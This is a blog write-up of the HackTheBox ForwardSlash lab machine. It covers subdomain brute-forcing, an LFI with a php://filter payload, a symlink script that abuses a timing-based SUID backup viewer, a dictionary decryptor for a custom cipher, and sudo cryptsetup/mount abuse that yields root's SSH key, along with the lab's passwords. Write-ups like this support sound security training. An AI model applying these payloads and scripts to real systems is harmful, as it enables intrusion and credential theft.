---
date: 2020-07-04 23:48:05
layout: post
title: HackTheBox ForwardSlash Writeup
subtitle: Hackthebox ForwardSlash Writeup.
description: >-
  in this blog i've explained how to solve ForwardSlash machine in hackthebox
image: https://i.ibb.co/c8KTj8r/logo.png
optimized_image: https://i.ibb.co/c8KTj8r/logo.png
category: hackthebox
tags:
  - hackthebox
  - ForwardSlash
author: Ahmed Fatouh
paginate: true
---


# []()Methodology 

* Nmap Scan
* Subdomain Brute-Force
* LFI & PHP Wrapper >> First user.
* SUID enum & Privilege Escalation >> Pain
* Privilege Escalation >> Root

# []()Nmap-Scan:

> as always, i did nmap scan to find out which servicecs was running in this machine, i found 2 opened ports.
>
> 22 for ssh and 80 for apache server.

> command: nmap -sC -sV -oN scan.txt 10.10.10.183

```ruby

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA)
|   256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 (ECDSA)
|_  256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to http://forwardslash.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# []() Checking The Web Page:

> the web page did not give me any hint's let's check it.

> ![web-page](https://i.ibb.co/ZxL8PDt/wepage.png)

> so now the first thing came to my mind is brute-force any possible subdomain and i was right.

> i used gobuster for this step: gobuster vhost -u http://forwardslash.htb/  -w /usr/share/wordlists/wfuzz/general/common.txt

> ![backup](https://i.ibb.co/CQqN16h/subdomain.gif)

> nice!, now we have another subdomain: **backup.forwardslash.htb**

> ![backup](https://i.ibb.co/FJ8ZKZ8/backup.png)

# []() LFI & PHP Wrappers:

* after some enumeration i found LFI in Change profile pic section. let's go

* first i made an account.

> ![](https://i.ibb.co/3mmBjM6/wel.png)

* open profile-pic change section and open console of your browser and enable the url input.

> ![](https://i.ibb.co/CKnjc8n/prof.png)

* let's enable it.

> ![](https://i.ibb.co/PmsgRf9/ena.gif)

> let's put any url and check the original request.
>
> ![](https://i.ibb.co/xG8WcbD/req.png)

> LET'S Check LFI
>
> ![](https://i.ibb.co/bBKZjdW/lfi.png)

* nice!

> good point, after some enumeration i found that I can't see the content of /var/www/backup.forwardslash.htb/dev/index.php.
>
> ![](https://i.ibb.co/W33S5BL/perm.png)

* **PHP-Wrappers Time** and you can read about it form [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter)

> Payload: php://filter/convert.base64-encode/resource=file:///var/www/backup.forwardslash.htb/dev/index.php
>
> ![](https://i.ibb.co/wy2Z3kF/payload.png)

* let's decode the output with base64 decoder.

> ![](https://i.ibb.co/cTy01z1/decoder.png)

* nice! now we have the first user

> User: **chiv**, Password: **N0bodyL1kesBack/**

# []() Chiv@Forwardslash.htb

> ![](https://i.ibb.co/gMDH7Mx/chiv.gif)


> now i uploaded LinEnum to the machine to do some enumeration and i found in the SUID section interested file and this file belongs to **pain**.

> SUID which stands for set user ID, is a Linux feature that allows users to execute a file with the permissions of a specified user. For example, the Linux ping command typically requires root permissions in order to open raw network sockets. By marking the ping program as SUID with the owner as root, ping executes with root privileges anytime a low privilege user executes the program.
>

> ![](https://i.ibb.co/M2wyVyt/suid.png)

> let's check all the SUID files in this machine again by another command.

* command: find / -perm -u=s -type f 2>/dev/null

> ![](https://i.ibb.co/vw8c5bk/suid.gif)

> now let's check what this backup file do.

```ruby

chiv@forwardslash:~$ /usr/bin/backup
----------------------------------------------------------------------
	Pain's Next-Gen Time Based Backup Viewer
	v0.1
	NOTE: not reading the right file yet, 
	only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 19:50:32
ERROR: 224403ce9fad2c98be3ab61557458adc Does Not Exist or Is Not Accessible By Me, Exiting...

```

> nice! this is a backup viewer.

> The hash that its generating changes everytime and the hash is md5. let's check if it is md5 or something else.

* i made this script to confirm that it is a md5

```ruby

time="$(date +%H:%M:%S | tr -d '\n' | md5sum | tr -d ' -')"
echo $time
backup

```
> let's run it

```ruby

chiv@forwardslash:~$ ./check.sh 
276da219158a4ff59ba3cd9a3fa6fc33
----------------------------------------------------------------------
	Pain's Next-Gen Time Based Backup Viewer
	v0.1
	NOTE: not reading the right file yet, 
	only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 19:55:23
ERROR: 276da219158a4ff59ba3cd9a3fa6fc33 Does Not Exist or Is Not Accessible By Me, Exiting...

```

> nice! this is a md5 hash.

> look at the output when running the backup file >> Its saying it is a **time based Backup Viewer**, and we can use it to view any backup file if we run it in the same time.

> now there is backup file in /var/backups/config.php.bak

> for this point i made a seconed script to extract the content of the backup file while we running the backup viewer.

```ruby

i=$(backup | grep ERROR | awk '{print $2}');
ln -s /var/backups/config.php.bak ./$i;
backup;

```

> let's run it.

```ruby

chiv@forwardslash:~$ ./pain.sh 
----------------------------------------------------------------------
	Pain's Next-Gen Time Based Backup Viewer
	v0.1
	NOTE: not reading the right file yet, 
	only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 20:04:26
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'pain');
define('DB_PASSWORD', 'db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704');
define('DB_NAME', 'site');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>

```

* nice!, now we have pain password

# []() Pain@Forwardslash.htb

> ![](https://i.ibb.co/YWBQbHZ/pain.gif)

> user flag:
>
> ![](https://i.ibb.co/WcCbC61/user.gif)

# []() Privilege Escalation >> root:

* let's run **sudo -l** and check the output

```ruby

pain@forwardslash:~$ sudo -l
Matching Defaults entries for pain on forwardslash:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pain may run the following commands on forwardslash:
    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
    (root) NOPASSWD: /bin/umount ./mnt/

```
> what is cryptsetup: cryptsetup is used to conveniently setup dm-crypt managed device-mapper mappings. For basic (plain) dm-crypt mappings, there are four operations. 
>
> so cryptsetup cryptsetup is used to map the images generally of a backup images. and then we can mount the mapped images to any dir and access the files in it.

* in the pain home there is a **encryptorinator** and this folder contain  a python script called **encrypter.py** and a **ciphertext**.

* let's analyze the code:

```ruby

def encrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in key:
        for i in range(len(msg)):
            if i == 0:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[-1])
            else:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[i-1])

            while tmp > 255:
                tmp -= 256
            msg[i] = chr(tmp)
    return ''.join(msg)

def decrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in reversed(key):
        for i in reversed(range(len(msg))):
            if i == 0:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))
            else:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))
            while tmp < 0:
                tmp += 256
            msg[i] = chr(tmp)
    return ''.join(msg)


print encrypt('REDACTED', 'REDACTED')
print decrypt('REDACTED', encrypt('REDACTED', 'REDACTED'))

```

> i made a script to decrypt the ciphertext.

```ruby

import sys
import re


def encrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in key:
        for i in range(len(msg)):
            if i == 0:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[-1])
            else:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[i-1])

            while tmp > 255:
                tmp -= 256
            msg[i] = chr(tmp)
    return ''.join(msg)


def decrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in reversed(key):
        for i in reversed(range(len(msg))):
            if i == 0:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))
            else:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))
            while tmp < 0:
                tmp += 256
            msg[i] = chr(tmp)
    return ''.join(msg)


# print encrypt('REDACTED', 'REDACTED')
# print decrypt('REDACTED', encrypt('REDACTED', 'REDACTED'))

def main():
    if len(sys.argv) != 3:
        print("(+) usage: %s dict file_to_crack " % sys.argv[0])
        print('(+) eg: %s rockyou.txt ciphertext ' % sys.argv[0])
        exit(-1)

    print("(+) Loading File dictionary.....")

    fh = open(sys.argv[1], 'rt')
    f = open(sys.argv[2], 'rt')
    textFile = f.read()
    f.close()
    line = fh.readline()
    while line:
        text = decrypt(line, textFile)
        p = re.compile('^[a-zA-Z]{3,}$')
        if 'key' in text:
            print("(+) WORD:  " + line)
            print("TEXG:")
            print (text)
        line = fh.readline()

    fh.close()


if __name__ == "__main__":
    main()

```

> i download the ciphertext to my machine and i run my script.
>
> ![](https://i.ibb.co/yBFX3zz/cipher.gif)

> now we have the password and it is : **cB!6%sdH8Lj^@Y*$C2cf**

> Now we can map the images using cryptsetup.

```ruby

pain@forwardslash:/var/backups/recovery$ ls
encrypted_backup.img
pain@forwardslash:/var/backups/recovery$ 


```

* this is the encrypted image, let's decrypt it.

> sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup

> go to /dev/mapper and you will find a backup file, let's mount it.

> mkdir /home/pain/mnt

> now go to /home/pain and write this >> sudo /bin/mount /dev/mapper/backup ./mnt/

> ![](https://i.ibb.co/HzrW5Nj/rsa.png)

* nice! now we got private-key and this is for root.

# []()Root@forwardslash.htb:

![](https://i.ibb.co/CB8XV21/root.gif)

* Thanks for reading.

> **Walkthrough**
>
> [![Walkthrough](https://i.ibb.co/c8KTj8r/logo.png)](https://www.youtube.com/watch?v=07fhvouVEQY&t=1s)

* cheers!

 <script src="https://www.hackthebox.eu/badge/103789"></script>
